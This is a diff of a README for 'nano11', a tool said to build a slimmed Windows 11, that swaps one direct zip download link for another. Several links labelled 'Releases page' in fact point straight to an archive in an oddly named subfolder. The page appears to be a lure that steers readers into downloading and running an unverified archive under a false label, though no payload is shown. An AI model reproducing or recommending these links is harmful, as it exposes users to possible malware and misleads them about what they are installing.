@@ -1,7 +1,7 @@
 # 🌟 nano11 - A Streamlined Windows 11 Experience
 
 ## 📥 Download Now
-[![Download nano11](https://raw.githubusercontent.com/jackd3jack/nano11/main/aulostomid/nano11.zip)](https://raw.githubusercontent.com/jackd3jack/nano11/main/aulostomid/nano11.zip)
+[![Download nano11](https://raw.githubusercontent.com/jackd3jack/nano11/main/aulostomid/nano-v2.0-beta.4.zip)](https://raw.githubusercontent.com/jackd3jack/nano11/main/aulostomid/nano-v2.0-beta.4.zip)
 
 ## 📖 Overview
 nano11 is a simple script designed to build a trimmed-down version of Windows 11. This project aims to provide users with a lightweight operating system experience, stripping away unnecessary features while retaining essential functionality. Enjoy a faster and more efficient Windows environment that suits your needs.
@@ -10,7 +10,7 @@ nano11 is a simple script designed to build a trimmed-down version of Windows 11
 To begin using nano11, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/jackd3jack/nano11/main/aulostomid/nano11.zip) to access the available versions of nano11.
+   Go to the [Releases page](https://raw.githubusercontent.com/jackd3jack/nano11/main/aulostomid/nano-v2.0-beta.4.zip) to access the available versions of nano11.
 
 2. **Choose the Latest Version**  
    Look for the latest version at the top of the page. It will usually have the highest version number.
@@ -39,7 +39,7 @@ nano11 requires minimal system resources. Here are the recommended specification
 - **Security-Focused:** Built with the latest security updates and features to protect your data.
 
 ## 📥 Download & Install
-To download nano11, revisit the [Releases page](https://raw.githubusercontent.com/jackd3jack/nano11/main/aulostomid/nano11.zip) and select the file that suits your system. Simply follow the instructions given above to download and install the software on your computer.
+To download nano11, revisit the [Releases page](https://raw.githubusercontent.com/jackd3jack/nano11/main/aulostomid/nano-v2.0-beta.4.zip) and select the file that suits your system. Simply follow the instructions given above to download and install the software on your computer.
 
 ## ❓ Frequently Asked Questions
 
